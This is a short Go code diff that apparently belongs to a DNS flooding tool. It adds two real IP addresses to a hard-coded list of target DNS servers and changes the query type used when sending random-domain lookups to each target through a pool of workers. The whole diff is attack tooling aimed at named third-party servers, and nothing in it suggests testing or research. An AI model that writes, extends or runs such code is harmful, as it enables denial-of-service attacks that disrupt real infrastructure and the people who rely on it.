@@ -17,6 +17,8 @@ var targetDNSServers = map[string]struct{}{
 	"194.67.2.109:53":   {},
 	"84.252.147.118:53": {},
 	"84.252.147.119:53": {},
+	"95.173.148.51:53":  {},
+	"95.173.148.50:53":  {},
 }
 
 type DNSServerStatus struct {
@@ -44,7 +46,7 @@ func startDNS() {
 			target:  targetDNSServer,
 		}
 		questionDomain := getRandomDomain() + "."
-		dnsServers[targetDNSServer].message.SetQuestion(questionDomain, dns.TypeAAAA)
+		dnsServers[targetDNSServer].message.SetQuestion(questionDomain, dns.TypeA)
 	}
 
 	dnsChannel := make(chan *DNSServer, *flagDNSWorkers)
